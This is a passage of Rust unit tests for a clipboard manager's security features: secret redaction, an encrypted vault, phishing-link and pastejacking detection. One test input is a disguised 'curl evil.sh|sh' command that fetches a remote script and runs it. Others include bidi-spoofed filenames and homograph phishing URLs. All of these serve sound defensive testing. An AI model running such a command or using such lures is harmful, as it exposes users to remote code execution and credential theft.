        let _ = fs::remove_dir_all(tmp_store_dir);
    }

    #[test]
    fn test_encrypted_image_vault_multimodal_veil_and_24h_secret_ttl() {
        use crate::security::{materialize_temp_preview_image, IMAGE_VAULT_MAGIC};

        let tmp_dir = std::env::temp_dir().join(format!(
            "iclip_img_vault_ttl_{}",
            crate::model::now_unix_secs()
        ));
        let img_dir = tmp_dir.join("images");
        let _ = fs::create_dir_all(&img_dir);

        // 1. 存量明文 PNG 启动时自动原地加密升级为 ICLPIMG1，且解密读取与临时预览导出字节 100% 无损
        let fake_png = b"\x89PNG\r\n\x1a\nSENSITIVE_ID_IMAGE_PAYLOAD".to_vec();
        let legacy_path = img_dir.join("legacy_shot.png");
        fs::write(&legacy_path, &fake_png).unwrap();

        let mut store = ClipboardStore::new(tmp_dir.clone());
        let disk_bytes = fs::read(&legacy_path).unwrap();
        assert!(disk_bytes.starts_with(IMAGE_VAULT_MAGIC));
        assert_ne!(disk_bytes, fake_png);
        assert_eq!(
            store.read_image_bytes("legacy_shot.png").as_deref(),
            Some(fake_png.as_slice())
        );

        let preview_file = materialize_temp_preview_image(&img_dir, "legacy_shot.png").unwrap();
        assert_eq!(fs::read(&preview_file).unwrap(), fake_png);
        let _ = fs::remove_file(preview_file);

        // 篡改密文 -> HMAC 拦截拒绝解密
        let mut tampered = disk_bytes.clone();
        let last = tampered.len() - 3;
        tampered[last] ^= 0x5A;
        fs::write(&legacy_path, &tampered).unwrap();
        assert_eq!(store.read_image_bytes("legacy_shot.png"), None);

        // 2. 含敏链接 (?api_key=) 与含敏图片 OCR 识别遮罩
        let sec_link = ClipItem::new_text(
            "https://api.example.com/v1/models?api_key=VendorCustomSecretToken987654321"
                .to_string(),
            None,
        );
        assert_eq!(sec_link.kind, ClipContentType::Link);
        assert_eq!(
            sec_link.detected_sensitive_kind(),
            Some(crate::security::SensitiveSecretKind::ConnectionSecret)
        );
        assert!(sec_link.display_title(false, true).contains("••••••••••••"));
        assert!(
            redact_secrets(sec_link.text.as_deref().unwrap()).contains("api_key=***REDACTED***")
        );

        // 3. 未收藏敏感凭据 24h 自动销毁（收藏项与未完成待办永久豁免）
        let now = crate::model::now_unix_secs();
        let mut old_unpinned =
            ClipItem::new_text("sk-proj-OldEphemeralKey9876543210AbCdEf".to_string(), None);
        old_unpinned.created_unix_secs = now - 90_000;

        let mut old_pinned =
            ClipItem::new_text("sk-proj-PinnedPermanentKey9876543210XyZ1".to_string(), None);
        old_pinned.created_unix_secs = now - 90_000;
        old_pinned.is_pinned = true;

        let mut old_normal = ClipItem::new_text("普通历史会议笔记永久保留".to_string(), None);
        old_normal.created_unix_secs = now - 90_000;

        store.items = vec![old_pinned, old_unpinned, old_normal];
        let purged = store.purge_expired_unpinned_secrets(now, 86_400);
        assert_eq!(purged, 1);
        assert_eq!(store.items.len(), 2);
        assert!(store.items.iter().any(|i| i.is_pinned));
        assert!(store
            .items
            .iter()
            .any(|i| i.text.as_deref() == Some("普通历史会议笔记永久保留")));

        // 4. 一键无痕清扫未收藏敏感凭据（保留收藏项）与口令加密归档加解密核验
        let mut fresh_sec =
            ClipItem::new_text("sk-proj-TempSweepTarget9876543210AbCdEf".to_string(), None);
        fresh_sec.created_unix_secs = now;
        store.items.push(fresh_sec);
        assert_eq!(store.unpinned_sensitive_count(), 1);
        assert_eq!(store.sweep_all_unpinned_sensitive(), 1);
        assert_eq!(store.unpinned_sensitive_count(), 0);
        assert_eq!(store.items.len(), 2); // 收藏密钥与普通笔记均完好保留

        let plain_archive =
            export_pinned_archive_data(&store.items, &img_dir, "2.6.0", "dev").unwrap();
        let enc_archive = crate::security::seal_archive_with_passphrase(
            &plain_archive,
            "VaultPass#2026",
            &tmp_dir,
        );
        assert!(crate::security::is_encrypted_archive_bytes(&enc_archive));
        assert_eq!(
            crate::archive::merge_archive_data_full(&enc_archive, &[], &img_dir, None, None),
            Err(ArchiveBackupError::PassphraseRequiredOrIncorrect)
        );
        assert_eq!(
            crate::archive::merge_archive_data_full(
                &enc_archive,
                &[],
                &img_dir,
                Some("wrong"),
                None
            ),
            Err(ArchiveBackupError::PassphraseRequiredOrIncorrect)
        );
        let (dec_items, dec_sum) = crate::archive::merge_archive_data_full(
            &enc_archive,
            &[],
            &img_dir,
            Some("VaultPass#2026"),
            None,
        )
        .unwrap();
        assert_eq!(dec_sum.imported_new_count, 1);
        assert_eq!(dec_items.len(), 1);

        let _ = fs::remove_dir_all(tmp_dir);
    }

    #[test]
    fn test_pastejacking_bidi_guard_and_zero_width_emoji_preservation() {
        use crate::security::{
            inspect_clipboard_poison, is_terminal_app, sanitize_clipboard_poison, PoisonThreatKind,
        };

        // 1. Trojan Source Bidi 与 ANSI 终端劫持捕获及净化
        let bidi = "report_\u{202e}fdp.exe";
        assert!(matches!(
            inspect_clipboard_poison(bidi),
            Some(PoisonThreatKind::PastejackingOrBidi(_))
        ));
        assert_eq!(sanitize_clipboard_poison(bidi), "report_fdp.exe");

        let ansi_jack = "\x1b[32mcurl -s evil.sh|sh\rgit pull\n";
        assert!(matches!(
            inspect_clipboard_poison(ansi_jack),
            Some(PoisonThreatKind::PastejackingOrBidi(_))
        ));
        let clean_cmd = sanitize_clipboard_poison(ansi_jack);
        assert!(!clean_cmd.contains('\x1b'));
        assert!(!clean_cmd.contains('\r'));
        assert!(!clean_cmd.ends_with('\n'));

        // 2. 零宽幽灵字符清除与复合 Emoji ZWJ 零误伤保护
        let ghost = "SN\u{200b}-8899\u{feff}-01";
        assert_eq!(
            inspect_clipboard_poison(ghost),
            Some(PoisonThreatKind::ZeroWidthGhost(2))
        );
        assert_eq!(sanitize_clipboard_poison(ghost), "SN-8899-01");

        let emoji_ok = "极客开发 🧑‍💻 家庭 👨‍👩‍👧‍👦 完好保留";
        assert_eq!(inspect_clipboard_poison(emoji_ok), None);
        assert_eq!(sanitize_clipboard_poison(emoji_ok), emoji_ok);

        // 3. 动作置顶与 `@风险` 快筛
        let poison_item = ClipItem::new_text(bidi.to_string(), Some("Chrome".to_string()));
        assert!(poison_item.matches_query("@风险"));
        assert!(poison_item.matches_query("@敏感"));
        let acts = analyze_text_actions(bidi, false);
        assert_eq!(acts[0].id, "sanitize-invisible-poison");
        assert!(is_terminal_app(Some("WindowsTerminal")));
    }

    #[test]
    fn test_sensitive_file_guard_homograph_phishing_and_exif_strip() {
        use crate::engines::{
            analyze_file_actions, file_has_privacy_metadata, strip_file_metadata_to_clean_png,
        };
        use crate::security::{
            classify_sensitive_file_paths, inspect_link_risk, LinkRiskKind, SensitiveSecretKind,
        };
        use image::{codecs::png::PngEncoder, ColorType, ImageEncoder};

        // 1. 敏感私钥/凭据文件识别与 `.pub` / `.env.example` 零误伤
        assert_eq!(
            classify_sensitive_file_paths(&[r"C:\Users\dev\.ssh\id_ed25519".to_string()]),
            Some(SensitiveSecretKind::PrivateKey)
        );
        assert_eq!(
            classify_sensitive_file_paths(&[r"D:\certs\prod_bundle.pfx".to_string()]),
            Some(SensitiveSecretKind::PrivateKey)
        );
        assert_eq!(
            classify_sensitive_file_paths(&[r"C:\work\api\.env.production".to_string()]),
            Some(SensitiveSecretKind::ConnectionSecret)
        );
        assert_eq!(
            classify_sensitive_file_paths(&[r"C:\Users\dev\.ssh\id_ed25519.pub".to_string()]),
            None
        );
        assert_eq!(
            classify_sensitive_file_paths(&[r"C:\work\api\.env.example".to_string()]),
            None
        );

        let key_file_item = ClipItem::new_files(
            vec![r"C:\Users\dev\.ssh\id_rsa".to_string()],
            Some("explorer".to_string()),
        );
        assert_eq!(
            key_file_item.detected_sensitive_kind(),
            Some(SensitiveSecretKind::PrivateKey)
        );
        assert!(key_file_item.matches_query("@敏感"));

        // 2. 同形异义字钓鱼域名与高危可执行下载链接检测
        assert_eq!(
            inspect_link_risk("https://xn--80ak6aa92e.com/login"),
            Some(LinkRiskKind::HomographPhishing)
        );
        assert_eq!(
            inspect_link_risk("https://a\u{0440}ple.com/security"),
            Some(LinkRiskKind::HomographPhishing)
        );
        assert_eq!(
            inspect_link_risk("https://apple.com@evil-login.net/auth"),
            Some(LinkRiskKind::HomographPhishing)
        );
        assert_eq!(
            inspect_link_risk("https://mirror-untrusted.org/patcher.exe"),
            Some(LinkRiskKind::ExecutableDownload)
        );
        assert_eq!(
            inspect_link_risk(
                "https://github.com/nekoyoubi/iClip/releases/download/v2.6.0/iClip-Setup.exe"
            ),
            None
        );
        let phish_item = ClipItem::new_text(
            "https://xn--80ak6aa92e.com/login".to_string(),
            Some("Chrome".to_string()),
        );
        assert!(phish_item.matches_query("@风险"));
        assert!(phish_item.matches_query("@敏感"));

        // 3. 粘贴即焚条目删除彻底跳过撤销栈（零残留）
        let tmp_dir = std::env::temp_dir().join(format!(
            "iclip-iter5-test-{}-{}",
            std::process::id(),
            crate::model::now_unix_secs()
        ));
        let _ = fs::create_dir_all(&tmp_dir);
        let mut store = ClipboardStore::new(tmp_dir.clone());
        let burn_id =
            store.insert_or_promote(ClipItem::new_text("OTP-Secret-Burn-9921".to_string(), None));
        let _ = store.toggle_burn_after_paste(&burn_id);
        store.delete_by_id(&burn_id);
        assert_eq!(store.undo_last_delete(crate::model::now_unix_secs()), None);

        // 4. 含 eXIf 块的 PNG 照片检测与物理像素级重编码净化验证
        let mut raw_png = Vec::new();
        let rgba = [40u8, 120, 220, 255].repeat(16 * 16);
        PngEncoder::new(&mut raw_png)
            .write_image(&rgba, 16, 16, ColorType::Rgba8.into())
            .unwrap();
        // 在 IHDR 后（偏移 33）插入合法的空 eXIf 块：[len=4][eXIf][MM\0*][CRC=0]
        let mut exif_png = Vec::new();
        exif_png.extend_from_slice(&raw_png[..33]);
        exif_png.extend_from_slice(&4u32.to_be_bytes());
        exif_png.extend_from_slice(b"eXIf");
        exif_png.extend_from_slice(b"MM\x00*");
        exif_png.extend_from_slice(&0u32.to_be_bytes());
        exif_png.extend_from_slice(&raw_png[33..]);

        let dirty_path = tmp_dir.join("photo_with_exif.png");
        fs::write(&dirty_path, &exif_png).unwrap();
        assert!(file_has_privacy_metadata(&dirty_path));

        let file_acts = analyze_file_actions(&[dirty_path.to_string_lossy().to_string()], false);
        assert_eq!(file_acts.len(), 1);
        assert_eq!(file_acts[0].id, "file-strip-exif");

        let clean_bytes = strip_file_metadata_to_clean_png(&dirty_path).unwrap();
        let clean_path = tmp_dir.join("photo_clean.png");
        fs::write(&clean_path, &clean_bytes).unwrap();
        assert!(!file_has_privacy_metadata(&clean_path));

        let _ = fs::remove_dir_all(tmp_dir);
    }

    #[test]
    fn test_encrypted_memory_hash_forget_timed_pause_curl_cookie_and_jwt() {
        use crate::engines::{decode_jwt_inspection, redact_secrets};
        use crate::security::{classify_sensitive_text, SensitiveSecretKind};

        let tmp_dir = std::env::temp_dir().join(format!(
            "iclip-iter6-test-{}-{}",
            std::process::id(),
            crate::model::now_unix_secs()
        ));
        let _ = fs::create_dir_all(&tmp_dir);

        // 1. 旧明文 adaptive_intelligence.json 自动升级为认证密文，且删除条目连根抹除 SHA-256 指纹
        let mem_path = tmp_dir.join("adaptive_intelligence.json");
        fs::write(
            &mem_path,
            br#"{"reuseCounts":{"dead_hash":5,"keep_hash":2},"appAffinity":{"chatgpt":{"dead_hash":3}},"actionHabits":{}}"#,
        )
        .unwrap();

        let mut store = ClipboardStore::new(tmp_dir.clone());
        let raw_mem_on_disk = fs::read(&mem_path).unwrap();
        assert!(raw_mem_on_disk.starts_with(b"ICLPWIN1"));
        assert_eq!(store.reuse_count("dead_hash"), 5);

        let sec_id = store.insert_or_promote(ClipItem::new_text(
            "sk-proj-DeleteForgetHashTest998877665544".to_string(),
            Some("Chrome".to_string()),
        ));
        let sec_hash = store
            .items
            .iter()
            .find(|i| i.id == sec_id)
            .unwrap()
            .content_hash
            .clone();
        store.record_paste_usage(&sec_hash, Some("ChatGPT"));
        assert!(store.reuse_count(&sec_hash) >= 1);
        assert_eq!(store.target_affinity_count(&sec_hash, Some("ChatGPT")), 1);
        store.delete_by_id(&sec_id);
        assert_eq!(store.reuse_count(&sec_hash), 0);
        assert_eq!(store.target_affinity_count(&sec_hash, Some("ChatGPT")), 0);

        store.forget_memory_hashes(&["dead_hash".to_string()]);
        assert_eq!(store.reuse_count("dead_hash"), 0);
        assert_eq!(store.reuse_count("keep_hash"), 2);

        // 2. 定时无痕暂停与到点自动恢复 + 自然语言指令
        let t0 = 1_800_000_000u64;
        assert!(store.toggle_timed_pause(15, t0));
        assert!(store.is_paused);
        assert!(!store.check_auto_resume_pause(t0 + 14 * 60));
        assert!(store.is_paused);
        assert!(store.check_auto_resume_pause(t0 + 15 * 60));
        assert!(!store.is_paused);

        let msg = store.adopt_user_suggestion("无痕暂停 20 分钟");
        assert!(msg.contains("20 分钟"));
        assert!(store.is_paused);
        let msg2 = store.adopt_user_suggestion("恢复记录");
        assert!(msg2.contains("恢复"));
        assert!(!store.is_paused);

        // 3. cURL Cookie / X-API-Key / JSON Token 全量识别与结构无损脱敏
        let curl_cmd = "curl 'https://api.example.com/v1/me' \\\n  -H 'cookie: sessionid=ab98cd76ef543210; uid=42' \\\n  -H 'x-api-key: prod_key_1122334455667788' \\\n  --data-raw '{\"refresh_token\": \"rt_secret_998877665544\", \"ok\": true}'";
        assert_eq!(
            classify_sensitive_text(curl_cmd),
            Some(SensitiveSecretKind::ConnectionSecret)
        );
        let red = redact_secrets(curl_cmd);
        assert!(!red.contains("ab98cd76ef543210"));
        assert!(!red.contains("prod_key_1122334455667788"));
        assert!(!red.contains("rt_secret_998877665544"));
        assert!(red.contains("-H 'cookie: ***REDACTED***'"));
        assert!(red.contains("\"refresh_token\": \"***REDACTED***\""));

        // 4. 离线零联网 JWT 载荷与过期状态解码
        let sample_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1MSIsImV4cCI6MjAwMDAwMDAwMH0.sig_part_abc123456";
        let (decoded_valid, flag_valid) = decode_jwt_inspection(sample_jwt, 1_800_000_000).unwrap();
        assert_eq!(flag_valid, Some(true));
        assert!(decoded_valid.contains("有效"));
        let (_decoded_exp, flag_exp) = decode_jwt_inspection(sample_jwt, 2_100_000_000).unwrap();
        assert_eq!(flag_exp, Some(false));

        let _ = fs::remove_dir_all(tmp_dir);
    }

    #[test]
    fn test_webhook_pgp_age_redaction_and_granular_security_search_tags() {
        use crate::engines::redact_secrets;
        use crate::security::{classify_sensitive_text, is_webhook_url, SensitiveSecretKind};

        let feishu_hook = concat!(
            "https://open.",
            "feishu.cn/open-apis/bot/v2/hook/",
            "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
        );
        let wecom_hook = concat!(
            "https://qyapi.",
            "weixin.qq.com/cgi-bin/webhook/send?key=",
            "693a91f6-7xxx-4bc4-97a0-0ec2sifa5aaa"
        );
        let slack_hook = concat!(
            "https://hooks.",
            "slack.com/services/",
            "T00000000/B00000000/",
            "XXXXXXXXXXXXXXXXXXXXXXXX"
        );
        let discord_hook = concat!(
            "https://discord.",
            "com/api/webhooks/123456789012345678/",
            "AbCdEfGhIjKlMnOpQrStUvWxYz0123456789"
        );
        let pgp_block = concat!(
            "-----BEGIN PGP ",
            "PRIVATE KEY BLOCK-----\nlQOYBGTestSecretPayload==\n-----END PGP ",
            "PRIVATE KEY BLOCK-----"
        );
        let age_key = concat!(
            "AGE-SECRET-KEY-1",
            "QPZRY9X8GF2TVDW0S3JN54KHCE6MUA7LQPZRY9X8GF2TVDW0S3JN54KHCE"
        );

        for hook in [feishu_hook, wecom_hook, slack_hook, discord_hook] {
            assert_eq!(
                classify_sensitive_text(hook),
                Some(SensitiveSecretKind::ConnectionSecret)
            );
            assert!(is_webhook_url(hook));
            let red = redact_secrets(hook);
            assert!(red.contains("***WEBHOOK_REDACTED***"));
            assert_ne!(red, hook);
        }

        assert_eq!(
            classify_sensitive_text(pgp_block),
            Some(SensitiveSecretKind::PrivateKey)
        );
        assert_eq!(
            classify_sensitive_text(age_key),
            Some(SensitiveSecretKind::PrivateKey)
        );
        assert!(redact_secrets(age_key).contains("AGE-SECRET-KEY-1***REDACTED***"));

        let hook_item = ClipItem::new_text(feishu_hook.to_string(), Some("Feishu".to_string()));
        let key_item = ClipItem::new_text(age_key.to_string(), Some("Terminal".to_string()));
        let jwt_item = ClipItem::new_text(
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1MSJ9.sig1234567890".to_string(),
            None,
        );
        assert!(hook_item.matches_query("@webhook"));
        assert!(hook_item.matches_query("@apikey"));
        assert!(!hook_item.matches_query("@私钥"));
        assert!(key_item.matches_query("@私钥"));
        assert!(!key_item.matches_query("@jwt"));
        assert!(jwt_item.matches_query("@jwt"));
    }

    #[test]
    fn test_csprng_password_generator_pin_guard_and_archive_image_header_validation() {
        use crate::archive::is_valid_raster_image_header;
        use crate::intelligence::parse_quick_capture;
        use crate::security::{
            bump_password_generation_salt, evaluate_secure_password_query,
            expand_quick_capture_secret_body,
        };

        // 1. `@pin` 收藏筛选词零误伤，且重绘稳定、提交后轮换新熵
        assert_eq!(evaluate_secure_password_query("@pin"), None);
        assert_eq!(evaluate_secure_password_query("@secret"), None);

        let c1 = evaluate_secure_password_query("@pw 24").unwrap();
        let c1_repeat = evaluate_secure_password_query("@pw 24").unwrap();
        assert_eq!(c1.secret_value.len(), 24);
        assert_eq!(c1.secret_value, c1_repeat.secret_value);

        bump_password_generation_salt();
        let c2 = evaluate_secure_password_query("@pw 24").unwrap();
        assert_ne!(c1.secret_value, c2.secret_value);

        let alnum = evaluate_secure_password_query("@密码 18 无符号").unwrap();
        assert_eq!(alnum.secret_value.len(), 18);
        assert!(alnum
            .secret_value
            .chars()
            .all(|c| c.is_ascii_alphanumeric()));

        let pin8 = evaluate_secure_password_query("@pin码 8").unwrap();
        assert_eq!(pin8.secret_value.len(), 8);
        assert!(pin8.secret_value.chars().all(|c| c.is_ascii_digit()));

        let hex_key = evaluate_secure_password_query("@genkey").unwrap();
        assert_eq!(hex_key.secret_value.len(), 64);

        // 2. `> 生产数据库 :: @pw 24` 命名加密入库展开 + 口令加密归档文件导出测试
        let expanded = expand_quick_capture_secret_body("@pw 22").unwrap();
        assert_eq!(expanded.len(), 22);
        assert_ne!(expanded, "@pw 22");

        let tmp_dir = std::env::temp_dir().join(format!(
            "iclip-iter8-test-{}-{}",
            std::process::id(),
            crate::model::now_unix_secs()
        ));
        let _ = fs::create_dir_all(&tmp_dir);
        let mut store = ClipboardStore::new(tmp_dir.clone());
        let intent = parse_quick_capture("> 生产RDS口令 :: @pw 24").unwrap();
        let saved_id = store.capture_quick_note(&intent).unwrap();
        let saved_item = store.items.iter().find(|i| i.id == saved_id).unwrap();
        assert!(saved_item.is_pinned);
        assert_eq!(saved_item.custom_alias.as_deref(), Some("生产RDS口令"));
        assert_eq!(saved_item.text.as_deref().unwrap().len(), 24);

        let enc_dest = tmp_dir.join("vault_export.iclip");
        let (cnt, is_enc) = store
            .export_archive_to_file_with_passphrase(&enc_dest, Some("ExportKey#2026"))
            .unwrap();
        assert_eq!(cnt, 1);
        assert!(is_enc);
        assert!(crate::security::is_encrypted_archive_bytes(
            &fs::read(&enc_dest).unwrap()
        ));

        // 3. 归档内嵌图片魔数校验拦截伪造可执行载荷
        assert!(!is_valid_raster_image_header(b"MZ_FAKE_EXE_PAYLOAD_1234"));
        assert!(is_valid_raster_image_header(
            b"\x89PNG\r\n\x1a\n\x00\x00\x00\x0d"
        ));

        let _ = fs::remove_dir_all(tmp_dir);
    }

    #[test]
    fn test_rfc6238_offline_totp_wifi_env_guard_and_env_example_sanitizer() {
        use crate::engines::{analyze_text_actions, redact_secrets};
        use crate::model::ClipItem;
        use crate::security::{
            classify_sensitive_text, evaluate_totp_uri, generate_env_example_template,
            SensitiveSecretKind,
        };

        // 1. RFC 6238 Appendix B 官方标准测试向量验证
        let rfc_uri = "otpauth://totp/Example:alice@google.com?secret=GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ&digits=8&period=30&algorithm=SHA1";
        let v59 = evaluate_totp_uri(rfc_uri, 59).unwrap();
        assert_eq!(v59.code, "94287082");
        assert_eq!(v59.formatted_code, "9428 7082");
        assert_eq!(v59.remaining_seconds, 1);

        let v111 = evaluate_totp_uri(rfc_uri, 1_111_111_109).unwrap();
        assert_eq!(v111.code, "07081804");

        // 2. 2FA URI、Wi-Fi 密码识别脱敏与 `@2fa` 快筛及快捷动作置顶
        let std_2fa = "otpauth://totp/GitHub:devuser?secret=JBSWY3DPEHPK3PXP&issuer=GitHub";
        assert_eq!(
            classify_sensitive_text(std_2fa),
            Some(SensitiveSecretKind::PrivateKey)
        );
        let red_2fa = redact_secrets(std_2fa);
        assert!(!red_2fa.contains("JBSWY3DPEHPK3PXP"));
        assert!(red_2fa.contains("***2FA_SECRET_REDACTED***"));

        let item_2fa = ClipItem::new_text(std_2fa.to_string(), None);
        assert!(item_2fa.matches_query("@2fa"));
        assert!(item_2fa.matches_query("@totp"));
        let actions_2fa = analyze_text_actions(std_2fa, false);
        assert_eq!(actions_2fa[0].id, "totp-live-code");

        let wifi_str = "WIFI:T:WPA;S:CorpNet;P:SuperWifiPass2026;;";
        assert_eq!(
            classify_sensitive_text(wifi_str),
            Some(SensitiveSecretKind::ConnectionSecret)
        );
        let red_wifi = redact_secrets(wifi_str);
        assert!(!red_wifi.contains("SuperWifiPass2026"));
        assert!(red_wifi.contains("P:***WIFI_REDACTED***;"));

        // 3. `.env` 真实密钥识别、占位符豁免与一键生成 `.env.example`
        let placeholder_env = "PORT=3000\nAPI_KEY=your_api_key_here\nDB_PASSWORD=changeme";
        assert_eq!(classify_sensitive_text(placeholder_env), None);

        let prod_env = "# Prod\nPORT=8080\nNODE_ENV=production\nDB_PASSWORD=ProdDb99#K2mZpQ8!\nDATABASE_URL=\"postgresql://admin:RealPass99@10.0.0.12:5432/core\"";
        assert_eq!(
            classify_sensitive_text(prod_env),
            Some(SensitiveSecretKind::ConnectionSecret)
        );
        let example = generate_env_example_template(prod_env).unwrap();
        assert!(example.contains("# Prod"));
        assert!(example.contains("PORT=8080"));
        assert!(example.contains("DB_PASSWORD=your_db_password_here"));
        assert!(
            example.contains("DATABASE_URL=\"postgresql://user:password@localhost:5432/dbname\"")
        );
        assert!(!example.contains("ProdDb99"));
        assert!(!example.contains("RealPass99"));
    }

    #[test]
    fn test_dynamic_template_8_placeholders_cloud_keys_wireguard_and_security_audit() {
        use crate::engines::{redact_secrets, render_dynamic_template};
        use crate::model::ClipItem;
        use crate::security::{
            classify_sensitive_text, is_security_audit_query, SensitiveSecretKind,
        };
        use crate::store::ClipboardStore;

        // 1. 验证阿里云 LTAI、腾讯云 AKID、Stripe sk_live_、Telegram Bot、npm 与 WireGuard 私钥识别脱敏
        let ali_ak = concat!("LTAI", "5t9x8K2mPq7NvWzR4BcD");
        let tencent_ak = concat!("AKID", "z8krbsJ5yKBZQpn74WFkmLPx3gnPhESA");
        let stripe_key = concat!("sk_live_", "51NxyzTestMockSecretKey998877");
        let tg_bot = concat!("123456789", ":AA", "HdqTcvCH1vGWJxfSeofSAs0K5PALDsawX");
        let npm_tok = concat!("npm_", "1234567890abcdefABCDEF1234567890abcd");
        let wg_conf = concat!(
            "[Interface]\nPrivateKey = ",
            "cGxhY2Vob2xkZXJ3aXJlZ3VhcmRwcml2YXRla2V5MTI=",
            "\nAddress = 10.8.0.2/24"
        );

        for k in [ali_ak, tencent_ak, stripe_key, tg_bot, npm_tok] {
            assert_eq!(
                classify_sensitive_text(k),
                Some(SensitiveSecretKind::ApiKey)
            );
            assert_ne!(redact_secrets(k), k);
        }
        assert_eq!(
            classify_sensitive_text(wg_conf),
            Some(SensitiveSecretKind::PrivateKey)
        );
        assert!(redact_secrets(wg_conf).contains("***WG_KEY_REDACTED***"));

        // 2. 验证 Windows 动态模板支持全部 8 大占位符（含空格与大小写容忍）及 `{{clip_redacted}}`
        let ctx = format!("日志 key={ali_ak} 手机 13812345678");
        let tpl = "单号:{{ uuid }}|日:{{date}}|时:{{time}}|周:{{weekday}}|戳:{{ts}}|敏:{{ clip_redacted }}";
        let out = render_dynamic_template(tpl, Some(&ctx));
        assert!(!out.contains("{{"));
        assert!(!out.contains(ali_ak));
        assert!(out.contains("138****5678"));
        assert!(out.contains("星期"));

        // 3. 验证 `@体检` / `@安全` 识别及未收藏投毒/钓鱼/敏感风险全量清零（收藏项豁免）
        assert!(is_security_audit_query("@体检"));
        assert!(is_security_audit_query("@shield"));
        assert!(!is_security_audit_query("@pin"));

        let tmp_dir = std::env::temp_dir().join(format!(
            "iclip-iter10-test-{}-{}",
            std::process::id(),
            crate::model::now_unix_secs()
        ));
        let _ = fs::create_dir_all(&tmp_dir);
        let mut store = ClipboardStore::new(tmp_dir.clone());

        let mut pinned_sec = ClipItem::new_text(ali_ak.to_string(), None);
        pinned_sec.is_pinned = true;
        let unpinned_wg = ClipItem::new_text(wg_conf.to_string(), None);
        let poison_cmd = ClipItem::new_text("echo safe\u{202E}evil".to_string(), None);
        assert!(unpinned_wg.matches_query("@体检"));
        assert!(poison_cmd.matches_query("@体检"));

        store.items = vec![pinned_sec, unpinned_wg, poison_cmd];
        assert_eq!(store.unpinned_sensitive_count(), 2);
        let swept = store.sweep_all_unpinned_sensitive();
        assert_eq!(swept, 2);
        assert_eq!(store.items.len(), 1);
        assert!(store.items[0].is_pinned);

        let _ = fs::remove_dir_all(tmp_dir);
    }

    #[test]
    fn test_zero_knowledge_secret_capsule_cross_os_tamper_guard_and_locked_search() {
        use crate::model::ClipItem;
        use crate::security::{
            contains_secret_capsule, evaluate_secret_capsule_command, open_secret_capsule,
            seal_secret_capsule, SecretCapsuleCommand,
        };

        let tmp_dir = std::env::temp_dir().join(format!(
            "iclip-iter11-test-{}-{}",
            std::process::id(),
            crate::model::now_unix_secs()
        ));
        let _ = fs::create_dir_all(&tmp_dir);

        let secret_msg = "核心数据库主口令：WinMac#2026_ZeroKnowledge! 🔐";
        let envelope = seal_secret_capsule(secret_msg, "8866", &tmp_dir).unwrap();
        assert!(contains_secret_capsule(Some(&envelope)));
        assert!(!envelope.contains("WinMac#2026"));

        let chat_wrapped = format!("【飞书私聊】\n{envelope}\n请用口令解锁");
        assert_eq!(open_secret_capsule(&chat_wrapped, "0000"), None);
        assert_eq!(
            open_secret_capsule(&chat_wrapped, "8866").as_deref(),
            Some(secret_msg)
        );

        // 篡改密文末尾 1 字节，常量时间 HMAC-SHA256 鉴权必须拒绝
        let mut tampered = envelope.clone();
        let replacement_ch = if tampered.ends_with('A') { 'B' } else { 'A' };
        tampered.pop();
        tampered.push(replacement_ch);
        assert_eq!(open_secret_capsule(&tampered, "8866"), None);

        // 验证 `@锁` / `@解锁` 命令解析与 `@密文` 检索
        let lock_cmd = evaluate_secret_capsule_command("@锁 9527", Some(secret_msg), None);
        assert_eq!(
            lock_cmd,
            Some(SecretCapsuleCommand::LockReady {
                passphrase: "9527".to_string(),
                plain_source: secret_msg.to_string(),
                is_inline_body: false,
            })
        );
        let unlock_cmd = evaluate_secret_capsule_command("@解锁 8866", None, Some(&chat_wrapped));
        assert_eq!(
            unlock_cmd,
            Some(SecretCapsuleCommand::UnlockDecrypted {
                decrypted_plain: secret_msg.to_string(),
            })
        );

        let cap_item = ClipItem::new_text(chat_wrapped, None);
        assert!(cap_item.matches_query("@密文"));

        // 验证群聊无空格粘连中文内嵌西里尔同形钓鱼链接精准剥壳并命中拦截
        let phish_msg = "紧急通知：请登录https://a\u{0440}ple.com/security核验账号";
        let extracted_url = crate::intelligence::extract_clean_share_url(phish_msg).unwrap();
        assert_eq!(extracted_url, "https://a\u{0440}ple.com/security");
        assert_eq!(
            crate::security::inspect_link_risk(&extracted_url),
            Some(crate::security::LinkRiskKind::HomographPhishing)
        );

        let _ = fs::remove_dir_all(tmp_dir);
    }

    #[test]
    fn test_reversible_privacy_twin_spreadsheet_injection_and_sensitive_zero_undo() {
        use crate::security::{
            classify_sensitive_text, inspect_restorable_privacy_twins, mask_with_privacy_twins,
            wipe_privacy_twins, SensitiveSecretKind,
        };

        wipe_privacy_twins();

        // 1. 验证 2026 新型 AI/SaaS 凭据（Groq / Supabase / Docker PAT）识别与双向 AI 替身指代一致性
        let groq_key = format!("{}{}", "gsk_", "AbCdEfGh1234567890IjKlMnOpQrStUvWx");
        let docker_pat = format!("{}{}", "dckr_pat_", "ZyXwVuTsRqPoNmLkJiHgFeDcBa9876");
        assert_eq!(
            classify_sensitive_text(&groq_key),
            Some(SensitiveSecretKind::ApiKey)
        );
        assert_eq!(
            classify_sensitive_text(&docker_pat),
            Some(SensitiveSecretKind::ApiKey)
        );

        let incident = format!(
            "主节点 10.24.8.19 同步至从节点 10.24.8.20 超时（重试 10.24.8.19 失败），Key={groq_key}，电话 13812345678，邮箱 ops@acme.cn"
        );
        let (masked, cnt) = mask_with_privacy_twins(&incident).unwrap();
        assert!(cnt >= 5);
        assert!(!masked.contains(&groq_key));
        assert!(!masked.contains("10.24.8.19"));
        assert!(!masked.contains("13812345678"));
        assert_eq!(masked.matches("[ICLIP_IP_1]").count(), 2);
        assert!(masked.contains("[ICLIP_IP_2]"));

        // 模拟复制 AI 回复，自动置顶 `restore-privacy-twin` 并无损还原真值
        let ai_reply = "curl -H 'Authorization: Bearer [ICLIP_KEY_1]' http://[ICLIP_IP_1]:8080/failover?standby=[ICLIP_IP_2]&phone=[ICLIP_PHONE_1]";
        let reply_actions = analyze_text_actions(ai_reply, false);
        assert_eq!(reply_actions[0].id, "restore-privacy-twin");
        let (restored, r_cnt) = inspect_restorable_privacy_twins(ai_reply).unwrap();
        assert_eq!(r_cnt, 4);
        assert_eq!(
            restored,
